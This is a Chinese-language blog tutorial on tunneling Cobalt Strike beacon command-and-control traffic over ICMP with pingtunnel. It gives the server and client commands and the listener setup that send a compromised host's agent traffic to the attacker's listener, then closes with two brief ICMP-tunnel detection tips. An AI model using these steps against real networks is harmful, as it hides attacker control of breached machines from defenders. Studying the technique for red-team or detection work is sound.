---
title: 通过PING tunnel 转换 beacon 流量
date: 2020-05-25 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。






---

# 0x00 前言

pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。

项目地址：https://github.com/esrrhs/pingtunnel

适用场景 ：特殊环境下icmp流量允许出网

实现原理：目标机将TCP流量封装成icmp，然后发送给服务端，服务端再从ICMP包解析出正常TCP流量最后发向cobalt strike的listener端口。

![img](https://www.yunzhijia.com/microblog/filesvr/5ecb722a6d67ff5532ecb217)

# 0x01 测试

Linux 服务端配置：

- 关闭linux系统icmp回应功能

```
echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all
wget https://github.com/esrrhs/pingtunnel/releases/download/2.2/pingtunnel_linux64.zip
sudo unzip pingtunnel_linux64.zip
sudo ./pingtunnel -type server
```

![img](https://www.yunzhijia.com/microblog/filesvr/5ecb724a6d67ff5532ecb2bc)

Windows 客户端配置：

这里以转发tcp为例

```
pingtunnel.exe -type client -l :4455 -s fe80::20c:29ff:fef6:f345%33 -t fe80::20c:29ff:fef6:f345%33:4455 -tcp 1
```

![img](https://www.yunzhijia.com/microblog/filesvr/5ecb726ca372592e271c89bd)

这里监听两个Listener 其中一个host为本地127.0.0.1 listener作用是让生成出来的agent去连接127.0.0.1:4455，这样流量就能走icmp隧道。

![img](https://www.yunzhijia.com/microblog/filesvr/5ecb72b128011f5157602394)

最终实现结果如下：

![img](https://www.yunzhijia.com/microblog/filesvr/5ecb728e28011f51576022d1)

# 0x02 防御检测

1、检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道的浏览器在同一时间会产生上千个 ICMP 数据包。

2、注意网络中 ICMP 数据包中 payload 大于 64 比特的数据包。

# 0x03 思考

…..